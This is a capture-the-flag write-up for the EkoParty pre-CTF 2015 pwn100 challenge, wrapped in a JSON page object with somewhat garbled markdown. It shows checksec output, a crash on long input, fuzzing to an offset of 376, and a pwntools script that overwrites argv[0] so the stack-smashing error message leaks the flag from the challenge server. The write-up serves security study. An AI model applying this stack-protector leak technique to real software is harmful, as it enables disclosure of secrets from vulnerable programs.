{"pageContext":{"html":"<p><a href=\"ctf=ekoparty-pre-ctf-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a></p>\n<p>Again we are given a <a href=\"/pwn100-7b695348e943a480c35dd04da85cc69d.zip\">zip</a>\nExtracting it gives us <a href=\"/xpl-f6bc2968e439d1efbb9b624b34c88c88.\">xpl</a> executable.</p>\n<p>`<code></code>bash\n$ file xpl\nxpl: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1856a84cc2663caa91e1511a2f0691652201fb95, not stripped</p>\n<p>./xpl\nInteresting data loaded at 0x7fff3a9971a0\nYour username? aa\n<code>Doing a checksec shows us</code>bash\ngdb-peda$ checksec\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n`<code></code>\nStrange! NX enabled, we can't execute a shell code. Lets debug the binary.\nWe create a fake flag.txt and run it. </p>\n<p>Interesting data loaded at 0x7fff3a9971a0\nWhen we inspect the address we see that it contains the contents of flag.txt i.e our fake flag.</p>\n<p>Also when we give a long string as username, it crashes.\n<code>bash $ ./xpl Interesting data loaded at 0x7fffab63c4c0 Your username? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *** stack smashing detected ***: ./xpl terminated Aborted</code>\n<a href=\"http://seclists.org/bugtraq/2010/Apr/243\">This</a> bugtraq post discusses a method to turn fortify into an attacker aid and use it to leak strings into the error output it prints. If we can manage to overwrite the argv[0] pointer we can leak any string for which we know the address.</p>\n<p>Perfect! we know the address of our flag and now our payload should be somewhat of the form 'A'<em>n+address(flag) and it would spew out our flag.\nQuick fuzzing with <a href=\"/fuzz-7223f967122f41dd911d838f7d9fa4ef.py\">fuzz.py</a>\n<code>bash $ python fuzz.py > fuzz.txt $ cat fuzz.txt | grep `cat flag.txt` 376 Your username? *** stack smashing detected ***: AAAA</code>\nn=376\nNow for the final exploit, little changes in <a href=\"/fuzz-7223f967122f41dd911d838f7d9fa4ef.py\">fuzz.py</a>\n`<code></code>python\nfrom pwn import *\nfrom time import sleep\nfor i in range(376,377):\n#sh=process('./xpl')\nsh=remote('challs.ctf.site',20001)\na=sh.recvline()\nsh.send('A'</em>i+p64(int(a.split()[4],16)))\nprint i,a\ntry:\nprint sh.recvline()\nexcept:\nprint i\nsleep(0.1)\n`<code></code>\ngives</p>\n<blockquote>\n<p>376  Interesting data loaded at 0x7fffffffe540\nYour username? <strong>* stack smashing detected *</strong>: EKO{pwning<em>stack</em>protector}</p>\n</blockquote>\n<p>Flag</p>\n<blockquote>\n<p>EKO{pwning<em>stack</em>protector}</p>\n</blockquote>","relativePath":"writeups/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/sudhackar"}}